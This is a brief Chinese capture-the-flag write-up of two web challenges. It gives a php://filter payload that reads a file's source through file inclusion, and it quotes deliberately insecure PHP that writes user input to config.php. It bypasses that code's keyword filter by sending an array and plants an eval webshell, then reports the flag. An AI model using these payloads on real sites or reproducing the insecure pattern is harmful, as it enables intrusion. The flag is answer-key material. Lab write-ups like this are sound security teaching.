# BW OJ 7.30思考

## Web

### BasicFileInclude

能看出是个文件包含漏洞，点击Flag可以看到URL有/?page=flag，考虑使用php伪协议，构造payload：`?page=php://filter/read=convert.base64-encode/resource=flag`

得到base64编码，再解码后得到flag

### Basic PHP 2

题目给出的代码如下：

```php
<?php
if(isset($_GET['content'])){
  $filename = 'config.php';
  $content = $_GET['content'];

  if(is_int(stripos($content, 'php')) || is_int(stripos($content, '<'))) {
    echo 'Invalid input';
  } else {
    file_put_contents($filename, $content);
    echo 'Success';
  }
}
```

接收来自 GET 请求的 `content` 参数，如果参数中不包含 `'php'` 和 `'<'`，则将参数的值写入 `config.php` 文件中并返回成功信息。如果参数中包含 `'php'` 或 `'<'`，则输出 `'Invalid input'` 表示拒绝写入。

考虑传入一个content数组，这样stripos函数会返回false，绕过is_int的检查

构造payload：`/index.php?content[]=<?php eval($_GET['a']);`

得到flag： `flag{pwnhub_first_shalon_ctf_web_php}`